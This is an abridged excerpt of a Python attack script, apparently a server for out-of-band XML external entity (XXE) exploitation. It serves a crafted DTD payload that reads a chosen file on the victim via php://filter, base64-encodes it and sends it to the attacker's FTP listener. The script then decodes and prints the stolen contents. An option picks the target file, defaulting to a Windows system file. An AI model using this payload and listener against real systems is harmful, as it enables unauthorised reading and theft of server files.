   ...
   while True:
      ...
      try:
         ...
         if data[:5] == 'GET /':
            ...
            payload = '<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={}">\r\n<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM \'ftp://{}:21/%file;\'>">'.format(file_path, lhost)
         ...
         while True:
            ...
            if data[:4] == 'USER':
               ...
               print('[+] Data:')
               print(base64.b64decode(data[4:].replace(' ', '').replace('/', '')).decode())
               ss.send(b'200 OK\r\n')
               flag = True
               break
            else:
...
if __name__ == '__main__':
   ...
   optparser.add_option('-f', '--file', dest='file', default='C:/Windows/win.ini', type='string', help='Specify a file path (default: C:/Windows/csup.txt)')
